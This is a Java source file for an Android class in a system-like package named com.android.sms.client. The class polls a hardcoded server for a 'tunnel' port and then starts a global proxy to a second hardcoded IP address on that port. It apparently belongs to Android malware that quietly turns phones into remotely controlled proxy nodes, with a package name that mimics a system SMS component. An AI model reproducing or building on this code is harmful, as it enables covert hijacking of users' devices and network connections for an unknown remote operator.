package com.android.sms.client;

import android.content.Context;
import android.util.Log;

import com.android.proxy.client.GlobalProxyUtil;
import com.oplay.nohelper.loader.Loader_Base_ForCommon;
import com.oplay.nohelper.volley.RequestEntity;
import com.oplay.nohelper.volley.Response;
import com.oplay.nohelper.volley.VolleyError;

/**
 * @author zyq 16-3-22
 */
public class GetRemotePortRunnable implements Runnable {

	private static final boolean DEBUG = true;
	private static final String TAG = "GetRemotePortRunnable";
	public static final String url = "http://52.77.240.92:80/tunnel/";
	private Loader_Base_ForCommon<RemotePortJson> mLoader;
	private Context mContext;

	public GetRemotePortRunnable(Context context) {
		this.mContext = context;
		mLoader = Loader_Base_ForCommon.getInstance();
	}

	@Override
	public void run() {
		try {
			if(DEBUG){
				Log.d(TAG,"开始轮询了");
			}
			RequestEntity<RemotePortJson> entity = new RequestEntity<RemotePortJson>(url, RemotePortJson.class);
			mLoader.onRequestLoadNetworkTask(entity, true, new Response.Listener() {
				@Override
				public void onResponse(Object response) {

					if (response instanceof RemotePortJson) {
						handleResponse((RemotePortJson) response);
					}
				}
			}, new Response.ErrorListener() {
				@Override
				public void onErrorResponse(VolleyError error) {
					Log.d(TAG, "网路请求错误:" + error.toString());
				}
			});

		} catch (Exception e) {
			if (DEBUG) {
				Log.d(TAG, e.fillInStackTrace().toString());
			}
		}
	}

	private void handleResponse(RemotePortJson remotePortJson){
		if(remotePortJson.getCode() == 0){
			RemotePortInfo info = remotePortJson.getData();
			if(info != null){
				int port = info.getPort();
				Log.d(TAG,"获取的远程端口是："+info.getPort());
				if(port > 10000){
					GlobalProxyUtil.getInstance(mContext).startProxy("103.27.79.138",port);
				}
			}
		}
	}


}
